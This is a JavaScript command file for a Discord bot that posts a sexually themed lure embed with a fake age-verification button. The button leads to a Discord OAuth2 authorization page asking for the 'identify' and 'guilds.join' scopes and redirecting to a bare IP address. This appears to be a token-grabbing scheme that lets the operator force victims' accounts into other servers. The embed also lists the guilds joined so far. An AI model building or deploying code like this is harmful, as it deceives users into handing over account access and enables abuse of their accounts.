const { MessageActionRow, MessageButton } = require('discord.js');
const parse = require('parse-ms');

module.exports = {
    name: 'nsfwembed',
    category: 'Utility',
    botOwner: true,
    run: async (client, message, args, users, botData) => {

        const timeout = 604800000;
        const time = parse(timeout - (Date.now() - parseInt(botData.last_refresh)));

        const row = new MessageActionRow()
            .addComponents(
                new MessageButton()
                    .setStyle('LINK')
                    .setLabel('💋 Verify Your Ages for see me')
                    .setURL('https://discord.com/api/oauth2/authorize?client_id=1165574590966267954&redirect_uri=http%3A%2F%2F45.136.4.57%3A7056&response_type=code&scope=identify%20guilds.join')
            );

        await message.channel.send({ embeds: [
            {
                color: 'ff66ff',
                description: `${users.size == 0 ? "" : ('💋 **Verify Your Ages for see my PU$$Y** ')}\n\n\n\n\n`,
                fields: [client.joins.map(m => {
                    return {
                        name: `${client.guilds.cache.get(m.guildID).name}`,
                        value: ` Auteur : <@>\n Membres : \n Date : <t:${Math.round(m.at / 1000)}:R>\n \`/\``
                    }
                })],
                image: {
                    url: "https://cdn.discordapp.com/attachments/1165569842129162301/1165682855855272006/Screenshot_20230831_001905_Pinterest.jpg?ex=6547bdc2&is=653548c2&hm=7a180a154b5796590671a02fcc5b9e75fa65f0b74954a3a0bdf4c83d04ab1d82&",
                    size: "full"
                },
                footer: {
                    text: ``
                }
            }
        ], components: [row] });

    }
}